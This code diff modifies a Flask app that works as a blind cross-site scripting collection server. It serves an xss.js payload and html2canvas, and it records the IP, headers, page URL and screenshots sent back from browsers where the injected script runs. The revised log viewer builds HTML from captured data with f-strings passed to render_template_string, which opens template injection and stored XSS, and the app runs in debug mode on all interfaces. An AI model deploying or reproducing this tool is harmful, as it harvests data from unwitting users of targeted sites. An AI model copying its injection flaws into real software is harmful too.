@@ -1,5 +1,4 @@
-import os
-from flask import Flask, request, jsonify, send_from_directory, render_template_string
+from flask import Flask, request, jsonify, render_template_string
 import datetime
 
 app = Flask(__name__, static_url_path='/static')
@@ -7,12 +6,25 @@ app = Flask(__name__, static_url_path='/static')
 logs = []
 
 @app.route('/')
-def home():
-    return "Blind XSS Logger Active"
+def index():
+    return 'Your service is live 🎉'
+
+@app.route('/xss.js')
+def serve_xss():
+    return app.send_static_file('xss.js')
+
+@app.route('/html2canvas.min.js')
+def serve_html2canvas():
+    return app.send_static_file('html2canvas.min.js')
 
 @app.route('/log', methods=['POST'])
 def log():
-    data = request.get_json()
+    print("Received /log POST")
+    data = request.get_json(force=True, silent=True)
+    print("Data:", data)
+    if not data:
+        return jsonify({"error": "No JSON received"}), 400
+
     log_entry = {
         'time': str(datetime.datetime.now()),
         'ip': request.remote_addr,
@@ -20,51 +32,30 @@ def log():
         'screenshot': data.get('screenshot'),
         'user_agent': request.headers.get('User-Agent'),
         'referer': request.headers.get('Referer'),
-        'origin': request.headers.get('Origin')
+        'origin': request.headers.get('Origin'),
+        'url': data.get('url')
     }
     logs.append(log_entry)
     print(f"New log: {log_entry}")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/logs')
-def view_logs():
-    # Simple HTML page to list all logs with screenshot images
-    html = """
-    <html>
-    <head><title>Blind XSS Logs</title></head>
-    <body>
-      <h1>Blind XSS Logs</h1>
-      {% for log in logs %}
-        <div style="margin-bottom:30px; padding:10px; border:1px solid #ccc;">
-          <b>Time:</b> {{ log.time }}<br>
-          <b>IP:</b> {{ log.ip }}<br>
-          <b>User Agent:</b> {{ log.user_agent }}<br>
-          <b>Referer:</b> {{ log.referer }}<br>
-          <b>Origin:</b> {{ log.origin }}<br>
-          <b>Headers:</b> <pre>{{ log.headers }}</pre>
-          {% if log.screenshot %}
-            <b>Screenshot:</b><br>
-            <img src="{{ log.screenshot }}" style="max-width:300px; border:1px solid #333;" />
-          {% else %}
-            <b>Screenshot:</b> No screenshot<br>
-          {% endif %}
-        </div>
-      {% else %}
-        <p>No logs yet.</p>
-      {% endfor %}
-    </body>
-    </html>
-    """
-    return render_template_string(html, logs=logs)
-
-@app.route('/xss.js')
-def serve_xss():
-    return send_from_directory('static', 'xss.js')
-
-@app.route('/html2canvas.min.js')
-def serve_html2canvas():
-    return send_from_directory('static', 'html2canvas.min.js')
+def show_logs():
+    html = "<h2>Captured Logs</h2><ul>"
+    for i, log in enumerate(logs):
+        html += f"<li><b>#{i+1} Time:</b> {log['time']}<br>"
+        html += f"<b>IP:</b> {log['ip']}<br>"
+        html += f"<b>User-Agent:</b> {log['user_agent']}<br>"
+        html += f"<b>URL:</b> {log['url']}<br>"
+        html += f"<b>Referer:</b> {log['referer']}<br>"
+        html += f"<b>Origin:</b> {log['origin']}<br>"
+        if log['screenshot']:
+            # show screenshot inline
+            html += f'<img src="{log["screenshot"]}" style="max-width:300px; border:1px solid #ccc;"/><br>'
+        html += "</li><hr>"
+    html += "</ul>"
+    return render_template_string(html)
+    
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=10000, debug=True)
